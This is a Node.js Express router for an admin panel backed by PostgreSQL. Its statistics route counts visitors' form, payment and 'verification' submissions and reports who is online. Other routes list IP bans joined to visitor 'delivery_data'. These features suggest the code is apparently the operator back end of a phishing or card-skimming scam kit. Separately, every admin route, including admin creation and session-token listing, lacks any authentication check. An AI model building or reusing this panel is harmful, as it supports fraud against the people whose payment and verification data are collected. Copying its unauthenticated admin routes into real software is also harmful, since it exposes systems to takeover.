const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const pool = require('../config/database');

// Admin login
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    const result = await pool.query(
      'SELECT * FROM admins WHERE username = $1 AND is_active = true',
      [username]
    );
    
    if (result.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    
    const admin = result.rows[0];
    const isValid = await bcrypt.compare(password, admin.password_hash);
    
    if (!isValid) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    
    res.json({ success: true, admin: { id: admin.id, username: admin.username } });
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Change password
router.post('/change-password', async (req, res) => {
  try {
    const { adminId, currentPassword, newPassword } = req.body;
    
    const result = await pool.query(
      'SELECT * FROM admins WHERE id = $1',
      [adminId]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Admin not found' });
    }
    
    const admin = result.rows[0];
    const isValid = await bcrypt.compare(currentPassword, admin.password_hash);
    
    if (!isValid) {
      return res.status(401).json({ success: false, message: 'Current password is incorrect' });
    }
    
    const newHash = await bcrypt.hash(newPassword, 10);
    await pool.query(
      'UPDATE admins SET password_hash = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2',
      [newHash, adminId]
    );
    
    res.json({ success: true, message: 'Password changed successfully' });
  } catch (error) {
    console.error('Change password error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get all admins
router.get('/admins', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT id, username, is_active, created_at FROM admins ORDER BY created_at DESC'
    );
    res.json({ success: true, admins: result.rows });
  } catch (error) {
    console.error('Error fetching admins:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Create new admin
router.post('/admins', async (req, res) => {
  try {
    const { username, password } = req.body;
    const passwordHash = await bcrypt.hash(password, 10);
    
    const result = await pool.query(
      'INSERT INTO admins (username, password_hash) VALUES ($1, $2) RETURNING id, username, is_active',
      [username, passwordHash]
    );
    
    res.status(201).json({ success: true, admin: result.rows[0] });
  } catch (error) {
    console.error('Error creating admin:', error);
    if (error.code === '23505') {
      return res.status(400).json({ success: false, message: 'Username already exists' });
    }
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get all banned users with visitor details
router.get('/banned', async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        b.id,
        b.session_id,
        b.ip_address,
        b.reason,
        b.custom_message,
        b.created_at,
        v.delivery_data,
        v.country
      FROM banned_users b
      LEFT JOIN visitors v ON b.session_id = v.session_id OR b.ip_address = v.ip_address
      ORDER BY b.created_at DESC
    `);
    res.json({ success: true, banned: result.rows });
  } catch (error) {
    console.error('Error fetching banned users:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Unban user via API
router.delete('/banned/:id', async (req, res) => {
  try {
    const { id } = req.params;
    await pool.query('DELETE FROM banned_users WHERE id = $1', [id]);
    res.json({ success: true, message: 'User unbanned successfully' });
  } catch (error) {
    console.error('Error unbanning user:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get statistics
router.get('/stats', async (req, res) => {
  try {
    const totalVisitors = await pool.query('SELECT COUNT(*) FROM visitors');
    const formSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE form_submitted = true');
    const paymentSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE payment_submitted = true');
    const verificationSubmissions = await pool.query('SELECT COUNT(*) FROM visitors WHERE verification_submitted = true');
    const onlineVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_online = true');
    const totalProducts = await pool.query('SELECT COUNT(*) FROM products WHERE is_active = true');
    
    const countryStats = await pool.query(`
      SELECT country, COUNT(*) as count 
      FROM visitors 
      GROUP BY country 
      ORDER BY count DESC 
      LIMIT 10
    `);
    
    res.json({
      success: true,
      stats: {
        totalVisitors: parseInt(totalVisitors.rows[0].count),
        formSubmissions: parseInt(formSubmissions.rows[0].count),
        paymentSubmissions: parseInt(paymentSubmissions.rows[0].count),
        verificationSubmissions: parseInt(verificationSubmissions.rows[0].count),
        onlineVisitors: parseInt(onlineVisitors.rows[0].count),
        totalProducts: parseInt(totalProducts.rows[0].count),
        countryStats: countryStats.rows
      }
    });
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Get admin sessions
router.get('/sessions', async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT * FROM admin_sessions ORDER BY created_at DESC'
    );
    res.json({ success: true, sessions: result.rows });
  } catch (error) {
    console.error('Error fetching sessions:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Delete admin session
router.delete('/sessions/:token', async (req, res) => {
  try {
    const { token } = req.params;
    await pool.query('DELETE FROM admin_sessions WHERE session_token = $1', [token]);
    res.json({ success: true, message: 'Session deleted successfully' });
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Delete all admin sessions
router.delete('/sessions', async (req, res) => {
  try {
    await pool.query('DELETE FROM admin_sessions');
    res.json({ success: true, message: 'All sessions deleted successfully' });
  } catch (error) {
    console.error('Error deleting sessions:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;
